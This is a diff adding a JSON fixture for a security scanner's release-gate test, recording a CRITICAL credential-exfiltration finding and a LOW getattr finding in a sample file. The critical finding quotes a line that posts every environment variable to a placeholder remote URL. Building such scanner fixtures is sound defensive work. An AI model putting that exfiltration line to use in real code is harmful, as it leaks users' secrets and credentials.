@@ -1,0 +1,62 @@
+{
+  "skill": {
+    "name": "fixture-critical",
+    "source": "tests/fixtures/skillspector/sample-critical",
+    "scanned_at": "2026-01-01T00:00:00+00:00"
+  },
+  "risk_assessment": {
+    "score": 92,
+    "severity": "CRITICAL",
+    "recommendation": "REJECT"
+  },
+  "components": [
+    {
+      "path": "danger.py",
+      "type": "python",
+      "lines": 3,
+      "executable": true,
+      "size_bytes": 42
+    }
+  ],
+  "issues": [
+    {
+      "id": "E9",
+      "finding_id": "finding-fixture-critical",
+      "category": "Credential Exfiltration",
+      "pattern": "Sends environment variables to a remote host",
+      "severity": "CRITICAL",
+      "confidence": 0.9,
+      "location": {
+        "file": "danger.py",
+        "start_line": 2,
+        "end_line": 2
+      },
+      "finding": "    post(URL, data=os.environ)",
+      "explanation": "Fixture: a CRITICAL finding used by the release-gate regression test.",
+      "remediation": "Remove the network call.",
+      "code_snippet": "def leak():\n    post(URL, data=os.environ)\n"
+    },
+    {
+      "id": "AST7",
+      "finding_id": "finding-fixture-low",
+      "category": "Dangerous Code Execution",
+      "pattern": "Dynamic attribute access via getattr()",
+      "severity": "LOW",
+      "confidence": 0.5,
+      "location": {
+        "file": "danger.py",
+        "start_line": 3,
+        "end_line": 3
+      },
+      "finding": "    return getattr(part, key, None)",
+      "explanation": "Fixture: a non-CRITICAL finding that must NOT fail the gate.",
+      "remediation": "Use an explicit mapping.",
+      "code_snippet": ""
+    }
+  ],
+  "suppressed_count": 0,
+  "suppressed": [],
+  "metadata": {},
+  "execution_successful": true,
+  "analysis_completeness": "full"
+}
